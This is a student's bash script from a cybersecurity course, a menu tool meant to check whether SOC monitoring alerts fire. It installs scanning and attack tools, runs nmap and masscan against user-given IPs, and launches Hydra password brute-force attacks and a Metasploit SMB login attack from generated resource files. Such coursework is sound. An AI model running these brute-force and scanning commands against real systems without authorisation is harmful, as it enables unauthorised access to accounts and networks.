#!/bin/bash

# Name of Student (Code): Muhd Fazil Istamar (S11)
# Class Code: CFC240722
# Name of Trainer: James Lim
# Filename: S11_SOC_Proj.sh

# Objective: SOChecker - Create a script that runs different cyber-attacks in a given network to check if monitoring alerts appear.

figlet "Welcome To SOCHecker!"

function at_log()
{ 
	atlog=at_$USER.log
	touch $atlog
	#Trigger printing of these details whenever user launch this bash script file.
	IPAdd=$(ifconfig | grep broadcast | awk '{printf $2}')
	MACAdd=$(ifconfig | grep ether | awk '{printf $2}')
	printf "\n \n"
	echo -e "\nHostname: $(hostname)" >> $atlog
	echo "IP Address: $IPAdd" >> $atlog
	echo "MAC Address: $MACAdd" >> $atlog
	printf "\n$(date)  $(whoami)  Launch SOC.sh bash file" >> $atlog

}
at_log

# Make use of nested function to house commands for sub-menu actions: Installation, Network scan, Cyber-Attack and Viewing of log files.
function menu()
{	
echo '============================================================'
echo '                      MAIN MENU                             '
echo '============================================================'
echo "What would you like to do, $USER?"
sleep 1
echo '[1] Install necessary applications for scan and attack.'
echo '[2] Perform network scan.'
echo '[3] Perform cyber-attack.'
echo '[4] View scan/attack log.'
echo -e "\n[E] Exit"
sleep 1
echo -e "\nPlease input desired option to proceed with next action."
read menu_choice
echo
	# Option [1] Install applications
	function install_app()
	{
		sudo apt-get update
		echo -e '\n1. NMAP'
		printf "\n$(date)  $(whoami)  Install Nmap" >> $atlog
		sleep 2
		sudo apt-get -yV install nmap
		sleep 2
		echo -e  '\n2. MASSCAN'
		sleep 2
		sudo apt-get install masscan
		printf "\n$(date)  $(whoami)  Install Masscan" >> $atlog
		sleep 2
		echo -e '\n3. METASPLOIT'
		sleep 2
		sudo apt-get install metasploit-framework
		printf "\n$(date)  $(whoami)  Install Metasploit Framework" >> $atlog
		sleep 2
		header=$(dpkg --list | head -n 5)
		Snmap=$(dpkg --list | grep nmap)
		Sms=$(dpkg --list | grep masscan)
		Smsfp=$(dpkg --list | grep msfpc)
		echo -e "$header \n$Snmap \n$Sms \n$Smsf" | lolcat
		sleep 2
		figlet -w 150 'All APPS INSTALLED' | lolcat
		sleep 2
		echo -e '\nReturn to Main Menu for more options.'
		menu
	}

	# Option [2] Network scan sub-menu
	function netscan()
	{
		echo '============================================================'
		echo '                Main Menu > [2] Network Scan                '
		echo '============================================================'
		sleep 1
		echo -e 'Which network scan would you like to use?'
		sleep 1
		echo '[1] Nmap'
		echo '[2] Masscan'
		echo -e '\n[R] Return to Main Menu\n'
		sleep 1
		read -p "Option  " netscan_choice
		# 
		case $netscan_choice in
			(1)
				echo -e "\nYou have chosen Option $netscan_choice - Nmap"
				printf "\n$(date)  $(whoami)  Chose Option [1] - Nmap" >> $atlog
				sleep 1
				echo -e "\nPlease provide your target IP Address." 
				read targetIP
				sudo nmap -Pn -sV -O $targetIP -oG nmp_output_g.txt
				printf "\n$(date)  $(whoami)  Peform Nmap scan  $targetIP  nmp_output_g.txt" >> $atlog
				echo -e "\nNmap scan output is saved in the current working directory as nmp_output_g.txt.\n"
				netscan
			;;
		
			(2)
				echo -e "\nYou have chosen Option $netscan_choice - Masscan"
				printf "\n$(date)  $(whoami)  Chose Option [2] - Masscan" >> $atlog
				sleep 1	
				echo -e "\nPlease provide your target IP Address." 
				read targetIP
				echo -e "\nPlease provide your target port number or range (e.g 0-100 or 20-80)." 
				read targetnum
				sudo masscan $targetIP -p $targetnum >> msc_output.txt
				printf "\n$(date)  $(whoami)  Peform Masscan  $targetIP  nmsc_output.txt" >> $atlog
				echo -e "\nMasscan output is saved in the current working directory as msc_output.txt.\n"
				netscan
			;;
					
			(R)
				echo -e "\nYou have chosen Option $netscan_choice - Return to Main Menu"
				printf "\n$(date)  $(whoami)  Chose Option [R] - Return to Main Menu" >> $atlog
				sleep 2
				menu
			;;
			
			(*)
				echo -e '\nPlease input the desired option: [1] or [2] or [R - Return to Main Menu].'
				printf "\n$(date)  $(whoami)  Chose invalid Option" >> $atlog
				sleep 2
				echo
				netscan
			;;
		esac
	}

	# Option [3] Cyber-attack sub-menu
	function cyberatt()
	{
		echo '============================================================'
		echo '                Main Menu > [3] Cyber-Attack                '
		echo '============================================================'
		sleep 1
		echo -e 'Which Cyber-Attack would you like to use?'
		sleep 1
		echo '[1] Hydra (UserID + Pwd)'
		echo '[2] Hydra (UserID list + Pwd list)'
		echo '[3] MSF (SMB Login)'
		echo -e '\n[R] Return to Main Menu\n'
		sleep 1
		read -p "Option  " cyberatt_choice
		
		case $cyberatt_choice in
			(1)
				# Use of function to execute Hydra attack using known userID and password.
				# This allows user to repeat Hydra attack by calling out the name of this function, like a loop instead of returning to sub-menu.
				function hydra_uid()
				{
					echo -e "\nYou have chosen Option $cyberatt_choice - Hydra (UserID + Pwd)"
					printf "\n$(date)  $(whoami)  Chose Option [1] - Hydra (UserID + Pwd)" >> $atlog
					echo -e "\n User ID?"
					read hydra_uid
					echo -e "\nPassword for chosen user ID?"
					read hydra_pwd
					echo -e "\nTarget IP Address?"
					read hydra_targetIP
					echo -e "\nType of service? (E.g ssh, apache2, ftp and etc.)"
					read hydra_svc
					sudo hydra -l $hydra_uid -p $hydra_pwd $hydra_targetIP $hydra_svc -vV -o hydra1_attack.log
					printf "\n$(date)  $(whoami)  Hydra Attack (UserID + Pwd)  $hydra_uid  $hydra_pwd  $hydra_targetIP  $hydra_svc  hydra1_attack.log" >> $atlog
					# Prompt user if he/she wish to repeat the same attack.
					echo -e "\n$USER, would you like to launch another Hydra attack? Y/N"
					read cyberatt_hydra1 
						if [ $cyberatt_hydra1 == Y ]
						then
							hydra_uid
							printf "\n$(date)  $(whoami)  Repeat Attack Option [1] - Hydra (UserID + Pwd)" >> $atlog
						else
							echo -e "\nReturn to [3] Cyber-Attack menu!"
							printf "\n$(date)  $(whoami)  Return to Cyber-Attack menu" >> $atlog
							sleep 2
							cyberatt
						fi
				}
				hydra_uid
			;;
		
			(2)
				# Use of function to execute Hydra attack using identified userID and password lists.
				function hydra_uidl()
				{
					echo -e "\nYou have chosen Option $cyberatt_choice - Hydra (UserID list + Pwd list)"
					printf "\n$(date)  $(whoami)  Chose Option [2] - Hydra (UserID list + Pwd list)" >> $atlog
					echo -e "\nUser ID list file?"
					read hydra_usrlst
					echo -e "\nPassword list file?"
					read hydra_pwdlst
					echo -e "\nTarget IP Address?"
					read hydra_targetIP
					echo -e "\nType of service? (E.g ssh, apache2, ftp and etc.)"
					read hydra_svc
					sudo hydra -L $hydra_usrlst -P $hydra_pwdlst $hydra_targetIP $hydra_svc -vV -o hydra2_attack.log
					printf "\n$(date)  $(whoami)  Hydra (UserID list + Pwd list)  $hydra_usrlst  $hydra_pwdlist  $hydra_targetIP  $hydra_svc  hydra2_attack.log" >> $atlog
					#Prompt user if he/she wish to repeat the same attack.
					echo -e "\n$USER, would you like to launch another Hydra attack? Y/N"
					read cyberatt_hydra2
						if [ $cyberatt_hydra2 == Y ]
						then
							hydra_uidl
							printf "\n$(date)  $(whoami)  Repeat Attack Option [2] - Hydra (UserID list + Pwd list)" >> $atlog
						else
							echo -e "\nReturn to [3] Cyber-Attack menu!"
							printf "\n$(date)  $(whoami)  Return to Cyber-Attack menu" >> $atlog
							sleep 2
							cyberatt
						fi
				}
				hydra_uidl
			;;
			
			(3)
				# Use of function to execute attack via SMB using MSFConsole.
				# Allow user to input the parameters such as name of resource file, target remote host, user name and password list.
				function msfc_smb()
				{
					echo -e "\nYou have chosen Option $cyberatt_choice - MSF (SMB Login)."
					printf "\n$(date)  $(whoami)  Chose Option [3] - MSF (SMB Login)" >> $atlog
					echo -e "\nName your resouce file (*.rc)."
					read smb_rcf
					echo -e "\nDefine your target remote hosts with Port 445 (State: Open)."
					read smb_rhip
					echo -e "\nDefine your User ID list file."
					read smb_uidlst
					echo -e "\nDefine your Password list file."
					read smb_pwdlst
					echo 'use auxiliary/scanner/smb/smb_login' > $smb_rcf.rc
					echo "set rhosts $smb_rhip" >> $smb_rcf.rc
					echo "set user_file $smb_uidlst" >> $smb_rcf.rc
					echo "set pass_file $smb_pwdlst" >> $smb_rcf.rc
					echo 'exploit' >> $smb_rcf.rc
					echo 'exit' >> $smb_rcf.rc
					msfconsole -r $smb_rcf.rc -o smb_attack.log
					printf "\n$(date)  $(whoami)  Completed attack via SMB using MSFConsole  smb_attack.log" >> $atlog
				}
				msfc_smb
				cyberatt
			;;
			
			(R)
				echo -e "\nYou have chosen Option $cyberat_choice - Return to Main Menu"
				menu
				printf "\n$(date)  $(whoami)  Chose Option [R] - Return to Main Menu" >> $atlog
			;;
			
			(*)
				echo -e "\nPlease input the desired option: [1] to [3] or [R - Return to Main Menu]."
				printf "\n$(date)  $(whoami)  Chose invalid Option.  Return to Cyber-Attack menu. " >> $atlog
				sleep 2
				echo
				cyberatt
			;;
		esac
	}
	
	#View Result/Log Sub-menu
	function viewlog()
	{
		echo '============================================================'
		echo '         Main Menu > [4] View scan/attack logs              '
		echo '============================================================'
		sleep 1
		echo -e 'Which logs would you like to view?'
		echo '[1] Nmap Scan Output'
		echo '[2] Masscan Output'
		echo '[3] Hydra 1 Attack Result'
		echo '[4] Hydra 2 Attack Result'
		echo '[5] MSFConsole Attack Result'
		echo '[6] Audit Trail Log'
		sleep 1
		echo -e '\n[R] Return to Main Menu\n'
		sleep 1
		read -p "Option  " viewlog_choice
		case $viewlog_choice in
			(1)
				# Viewing of Nmap scan results.
				echo -e "\nYou have chosen Option $viewlog_choice - Nmap Scan Output."
				cat nmp_output_g.txt
				sleep 4
				echo -e "\n$USER, would you like to view other logs? [Y/N]"
				read viewlog_nmp 
				if [ $viewlog_nmp == Y ]
				then
					echo -e "\nWill return to [4] View scan/attack Logs menu!"
					sleep 2
					viewlog
				else
					echo -e "\nWill return to Main Menu!"
					sleep2
					menu
				fi
			;;
		
			(2)
				# Viewing of Masscan results.
				echo -e "\nYou have chosen Option $viewlog_choice - Masscan Output."
				cat msc_output.txt
				sleep 4
				echo -e "\n$USER, would you like to view other logs? [Y/N]"
				read viewlog_msc 
				if [ $viewlog_msc == Y ]
				then
					echo -e "\nWill return to [4] View scan/attack Logs menu!"
					sleep 2
					viewlog
				else
					echo -e "\nWill return to Main Menu!"
					sleep 2
					menu
				fi
			;;
			
			(3)
				# Viewing of Hydra 1 attack results based on known user ID and password.
				echo -e "\nYou have chosen Option $viewlog_choice - Hydra 1 Attack Log."
				cat hydra1_attack.log
				sleep 4
				echo -e "\n$USER, would you like to view other logs? [Y/N]"
				read viewlog_hydra1 
				if [ $viewlog_hydra1 == Y ]
				then
					echo -e "\nWill return to [4] View scan/attack Logs menu!"
					sleep 2
					viewlog
				else
					echo -e "\nWill return to Main Menu!"
					sleep 2
					menu
				fi
			;;
			
			(4)
				# Viewing of Hydra 2 attack results based on preferred user and password list files.
				echo -e "\nYou have chosen Option $viewlog_choice - Hydra 2 Attack Log."
				cat hydra2_attack.log
				sleep 4
				echo -e "\n$USER, would you like to view other logs? [Y/N]"
				read viewlog_hydra2 
				if [ $viewlog_hydra2 == Y ]
				then
					echo -e "\nWill return to [4] View scan/attack Logs menu!"
					sleep 2
					viewlog
				else
					echo -e "\nWill return to Main Menu!"
					sleep 2
					menu
				fi
			;;
			
			(5)
				# Viewing of MSFConsole attack results based on known user ID and password.
				echo -e "\nYou have chosen Option $viewlog_choice - MSF Attack Result."
				cat smb_attack.log
				sleep 4
				echo -e "\n$USER, would you like to view other logs? [Y/N]"
				read viewlog_smb 
				if [ $viewlog_smb == Y ]
				then
					echo -e "\nWill return to [4] View scan/attack Logs menu!"
					sleep 2
					viewlog
				else
					echo -e "\nWill return to Main Menu!"
					sleep 2
					menu
				fi
			;;
			(6)
				# Viewing of audit trail entries based on users' actions when executing this batch script file.
				echo -e "\nYou have chosen Option $viewlog_choice - Audit Trail Log."
				cat at_$USER.log
				sleep 4
				echo -e "\n$USER, would you like to view other logs? [Y/N]"
				read viewlog_atlog
				if [ $viewlog_atlog == Y ]
				then
					echo -e "\nWill return to [4] View scan/attack Logs menu!"
					sleep 2
					viewlog
				else
					echo -e "\nWill return to Main Menu!"
					sleep 2
					menu
				fi
			;;
			
			(R)
				echo -e "\nYou have chosen Option $viewlog_choice - Return to Main Menu"
				menu
			;;
			
			(*)
				echo -e '\nPlease input the desired option: [1] to [6] or [R - Return to Main Menu].'
				.
				sleep 2
				echo
				viewlog
			;;
		esac		
	}
	
# Command in Line 30 will continue from here as user has decided on their option:-
	##	[1] Install applications
	##	[2] Perform network scan
	##	[3] Perform cyber-attack
	##	[4] View scan/attack logs
	##	[E] Exit from this bash script
	
	case $menu_choice in
		(1)
			echo "You have chosen Option $menu_choice - Install necessary application for scan and attack."
			sleep 2
			#Go to Function 'install_app'. It is at this point, the function get called out and the commands get executed. This applies to three other options.
			install_app	
		;;
	
		(2)
			echo "You have chosen Option $menu_choice - Perform network scan."
			sleep 2
			#Go to Function 'netscan'.
			netscan
		;;
		
		(3)
			echo "You have chosen Option $menu_choice - Perform cyber-attack."
			sleep 2
			#Go to Function 'cyberatt'.
			cyberatt	
		;;
			
		(4)
			echo "You have chosen Option $menu_choice - View scan/attack log."
			sleep 2
			#Go to Function 'viewlog'
			viewlog
		;;
		
		(E)
			#This option caters to user who wish to exit early.
			echo "You have chosen Option $menu_choice - Exit. Bye Bye and have a nice day!"
			sleep 2
			exit
		;;
		
		(*)
			#This option caters to user who input incorrect option not defined in 'case statement'.
			echo 'Please input the desired option: [1] to [4] or [E - Exit].'
			sleep 2
			echo
			menu
		;;
	esac		
}
menu
